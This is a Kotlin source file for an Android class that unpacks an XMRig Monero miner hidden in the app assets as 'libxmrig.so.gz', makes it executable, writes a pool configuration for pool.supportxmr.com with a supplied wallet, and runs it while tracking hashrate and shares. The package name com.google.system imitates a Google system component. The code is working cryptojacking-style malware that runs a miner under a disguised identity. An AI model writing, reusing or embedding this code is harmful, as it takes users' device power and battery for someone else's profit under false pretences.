package com.google.system

import android.content.Context
import kotlinx.coroutines.*
import java.io.*

class RealMiner(
    private val context: Context,
    private val wallet: String,
    private val poolHost: String = "pool.supportxmr.com",
    private val poolPort: Int = 3333,
    private val maxThreads: Int = 2,
    private val onStatusUpdate: ((MinerStatus) -> Unit)? = null
) {
    data class MinerStatus(
        val isMining: Boolean,
        val hashrate: Double,
        val sharesAccepted: Long,
        val sharesRejected: Long,
        val uptime: Long,
        val difficulty: Long,
        val poolConnection: Boolean,
        val rawOutput: String
    )

    private var minerProcess: Process? = null
    private var readJob: Job? = null
    private var isMining = false
    private var startTime = 0L
    private var currentHashrate = 0.0
    private var sharesAccepted = 0L
    private var sharesRejected = 0L
    private var poolConnected = false
    private var difficulty = 0L
    private var lastOutput = ""

    fun start(): String {
        if (isMining) return "Already mining"

        val binaryPath = extractBinary()
        if (binaryPath == null) {
            android.util.Log.e("RealMiner", "extractBinary returned null, check logcat for details")
            return "Failed to extract miner binary. Check logcat for details."
        }

        isMining = true
        startTime = System.currentTimeMillis()

        val configFile = createConfig()
        val cmd = arrayOf(
            binaryPath,
            "--config=${configFile.absolutePath}",
            "--threads=$maxThreads",
            "--donate-level=1"
        )

        try {
            minerProcess = Runtime.getRuntime().exec(cmd)

            readJob = CoroutineScope(Dispatchers.IO).launch {
                val reader = BufferedReader(InputStreamReader(minerProcess?.inputStream))
                while (isActive) {
                    val line = reader.readLine() ?: break
                    parseMinerOutput(line)
                }
            }

            return "Real XMR mining started\nWallet: ${wallet.take(10)}...${wallet.takeLast(6)}\nPool: $poolHost:$poolPort\nThreads: $maxThreads"
        } catch (e: Exception) {
            isMining = false
            return "Failed to start miner: ${e.message}"
        }
    }

    fun stop() {
        isMining = false
        readJob?.cancel()
        minerProcess?.destroy()
        minerProcess?.waitFor()
        minerProcess = null
    }

    fun getStatus(): MinerStatus {
        return MinerStatus(
            isMining = isMining,
            hashrate = currentHashrate,
            sharesAccepted = sharesAccepted,
            sharesRejected = sharesRejected,
            uptime = if (startTime > 0) System.currentTimeMillis() - startTime else 0,
            difficulty = difficulty,
            poolConnection = poolConnected,
            rawOutput = lastOutput
        )
    }

    private fun extractBinary(): String? {
        val binaryName = "libxmrig.so"
        val gzName = "libxmrig.so.gz"
        val destFile = File(context.filesDir, binaryName)

        if (destFile.exists() && destFile.length() > 1000000) {
            try {
                Runtime.getRuntime().exec(arrayOf("chmod", "755", destFile.absolutePath)).waitFor()
            } catch (_: Exception) {}
            android.util.Log.d("RealMiner", "Using cached binary: ${destFile.absolutePath} (${destFile.length()} bytes)")
            return destFile.absolutePath
        }

        var errorDetail = "unknown"
        try {
            android.util.Log.d("RealMiner", "Extracting miner binary from assets...")

            context.assets.openFd(gzName).use { fd ->
                android.util.Log.d("RealMiner", "Asset FD: start=${fd.startOffset}, length=${fd.declaredLength}, path=${fd.path}")
            }

            val assetStream = context.assets.open(gzName)
            val header = ByteArray(4)
            val headerRead = assetStream.read(header)
            assetStream.close()

            android.util.Log.d("RealMiner", "Header bytes: ${header.joinToString(", ") { "%02x".format(it) }}")

            val isGzip = headerRead >= 2 && header[0] == 0x1F.toByte() && header[1] == 0x8B.toByte()

            if (isGzip) {
                android.util.Log.d("RealMiner", "Detected GZIP format, decompressing...")
                context.assets.open(gzName).use { gzInput ->
                    java.util.zip.GZIPInputStream(gzInput).use { gz ->
                        FileOutputStream(destFile).use { output ->
                            val buffer = ByteArray(65536)
                            var total = 0L
                            var read: Int
                            while (gz.read(buffer).also { read = it } != -1) {
                                output.write(buffer, 0, read)
                                total += read
                            }
                            output.flush()
                            android.util.Log.d("RealMiner", "Decompressed $total bytes")
                        }
                    }
                }
            } else {
                android.util.Log.d("RealMiner", "Not GZIP (header=$headerRead), trying raw copy...")
                context.assets.open(gzName).use { rawInput ->
                    FileOutputStream(destFile).use { output ->
                        val buffer = ByteArray(65536)
                        var total = 0L
                        var read: Int
                        while (rawInput.read(buffer).also { read = it } != -1) {
                            output.write(buffer, 0, read)
                            total += read
                        }
                        output.flush()
                        android.util.Log.d("RealMiner", "Copied $total bytes")
                    }
                }
            }

            if (!destFile.exists() || destFile.length() < 1000000) {
                errorDetail = "extraction incomplete (${destFile.length()} bytes)"
                destFile.delete()
                android.util.Log.e("RealMiner", "Extraction failed: $errorDetail")
                return null
            }

            destFile.setExecutable(true)
            try {
                val chmodResult = Runtime.getRuntime().exec(arrayOf("chmod", "755", destFile.absolutePath))
                chmodResult.waitFor()
                android.util.Log.d("RealMiner", "chmod exit: ${chmodResult.exitValue()}")
            } catch (e: Exception) {
                android.util.Log.w("RealMiner", "chmod failed: ${e.message}")
            }

            android.util.Log.d("RealMiner", "Binary ready: ${destFile.absolutePath} (${destFile.length()} bytes)")
            return destFile.absolutePath
        } catch (e: java.util.zip.ZipException) {
            errorDetail = "gzip error: ${e.message}"
            android.util.Log.e("RealMiner", "GZIP extraction failed", e)
        } catch (e: java.io.IOException) {
            errorDetail = "IO error: ${e.message}"
            android.util.Log.e("RealMiner", "IO extraction failed", e)
        } catch (e: Exception) {
            errorDetail = "${e.javaClass.simpleName}: ${e.message}"
            android.util.Log.e("RealMiner", "Extraction failed", e)
        }

        destFile.delete()
        android.util.Log.e("RealMiner", "Binary extraction failed: $errorDetail")
        return null
    }

    private fun createConfig(): File {
        val config = """
        {
            "api": {
                "id": null,
                "worker-id": null
            },
            "http": {
                "enabled": false,
                "host": "127.0.0.1",
                "port": 0,
                "access-token": null,
                "restricted": true
            },
            "autosave": true,
            "background": false,
            "colors": false,
            "title": false,
            "randomx": {
                "init": -1,
                "init-avx2": -1,
                "mode": "auto",
                "1gb-pages": false,
                "rdmsr": false,
                "wrmsr": false,
                "cache_qos": false,
                "numa": false,
                "no_rdmsr": true
            },
            "pools": [
                {
                    "algo": null,
                    "coin": "monero",
                    "url": "$poolHost:$poolPort",
                    "user": "$wallet",
                    "pass": "x",
                    "rig-id": null,
                    "nicehash": false,
                    "keepalive": true,
                    "enabled": true,
                    "tls": false,
                    "tls-fingerprint": null,
                    "daemon": false,
                    "socks5": null,
                    "self-select": null,
                    "submit-to-origin": false
                }
            ],
            "retries": 5,
            "retry-pause": 5,
            "syslog": false,
            "log-file": null,
            "print-time": 30,
            "health-print-time": 60,
            "dmi": true
        }
        """.trimIndent()

        val configFile = File(context.filesDir, "xmrig-config.json")
        configFile.writeText(config)
        return configFile
    }

    private fun parseMinerOutput(line: String) {
        lastOutput = line

        when {
            line.contains("CONNECTED") || line.contains("connected to") -> {
                poolConnected = true
            }
            line.contains("new job") -> {
                val diffMatch = Regex("diff (\\d+)").find(line)
                if (diffMatch != null) {
                    difficulty = diffMatch.groupValues[1].toLongOrNull() ?: difficulty
                }
            }
            line.contains("accepted") -> {
                sharesAccepted++
                val hrMatch = Regex("(\\d+\\.?\\d*)\\s*(H/s|kH/s|MH/s)").find(line)
                if (hrMatch != null) {
                    val value = hrMatch.groupValues[1].toDoubleOrNull() ?: 0.0
                    currentHashrate = when (hrMatch.groupValues[2]) {
                        "kH/s" -> value * 1000
                        "MH/s" -> value * 1000000
                        else -> value
                    }
                }
            }
            line.contains("rejected") -> {
                sharesRejected++
            }
            line.contains("speed") || line.contains("hashrate") -> {
                val hrMatch = Regex("(\\d+\\.?\\d*)\\s*(H/s|kH/s|MH/s)").find(line)
                if (hrMatch != null) {
                    val value = hrMatch.groupValues[1].toDoubleOrNull() ?: 0.0
                    currentHashrate = when (hrMatch.groupValues[2]) {
                        "kH/s" -> value * 1000
                        "MH/s" -> value * 1000000
                        else -> value
                    }
                }
            }
        }

        onStatusUpdate?.invoke(getStatus())
    }
}
